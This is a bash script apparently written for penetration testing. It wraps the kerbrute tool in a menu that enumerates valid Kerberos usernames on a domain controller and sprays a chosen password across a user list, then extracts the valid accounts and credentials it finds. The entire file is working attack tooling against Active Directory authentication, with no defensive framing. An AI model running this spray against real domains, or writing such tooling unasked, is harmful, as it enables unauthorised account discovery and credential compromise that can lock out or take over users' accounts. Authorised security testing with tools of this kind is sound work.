#!/bin/bash

# ============================================
# kerbrute_spray.sh
# Automated Kerberos user enumeration
# and password spray via kerbrute
# Author: Fabrizio Fiorilli
# ============================================

print_header() {
    clear
    echo "===================================="
    echo "       KERBRUTE SPRAY"
    echo "===================================="
}

show_menu() {
    echo ""
    echo "[1] User enumeration   (userenum)"
    echo "[2] Password spray     (passwordspray)"
    echo "[3] Exit"
    echo "===================================="
    read -rp "Choose an option: " choice
}

get_params() {
    read -rp "Enter domain: " domain
    read -rp "Enter DC address: " dc
    read -rp "Enter wordlist path: " wordlist

    if [[ -z "$domain" ]] || \
       [[ -z "$dc" ]] || \
       [[ -z "$wordlist" ]]; then
        echo "[ERROR] All fields required."
        exit 1
    fi

    if [[ ! -f "$wordlist" ]]; then
        echo "[ERROR] Wordlist not found: $wordlist"
        exit 1
    fi
}

run_userenum() {
    echo ""
    echo "[+] Enumerating users on $domain..."
    echo "------------------------------------"
    kerbrute userenum \
    -d "$domain" \
    --dc "$dc" \
    "$wordlist" \
    -o "kerbrute_users_${domain}.txt"

    echo ""
    echo "[+] Valid users found:"
    grep "VALID" \
    "kerbrute_users_${domain}.txt" 2>/dev/null
}

run_spray() {
    read -rp "Enter userlist path: " userlist
    read -rp "Enter password to spray: " password

    if [[ ! -f "$userlist" ]]; then
        echo "[ERROR] Userlist not found: $userlist"
        exit 1
    fi

    echo ""
    echo "[+] Password spray on $domain..."
    echo "------------------------------------"
    kerbrute passwordspray \
    -d "$domain" \
    --dc "$dc" \
    "$userlist" \
    "$password" \
    -o "kerbrute_spray_${domain}.txt"

    echo ""
    echo "[+] Valid credentials found:"
    grep "VALID" \
    "kerbrute_spray_${domain}.txt" 2>/dev/null
}

print_summary() {
    echo ""
    echo "===================================="
    echo " Kerbrute completed."
    echo " Output files:"
    echo "------------------------------------"
    ls -lh *"${domain}"* 2>/dev/null
    echo "===================================="
}

run_monitor() {
    while true; do
        print_header
        show_menu

        case "$choice" in
            1) get_params; run_userenum ;;
            2) get_params; run_spray ;;
            3) echo "Goodbye."; exit 0 ;;
            *) echo "[ERROR] Invalid option." ;;
        esac

        print_summary
        echo ""
        read -rp "Press ENTER to continue..." _
    done
}

run_monitor
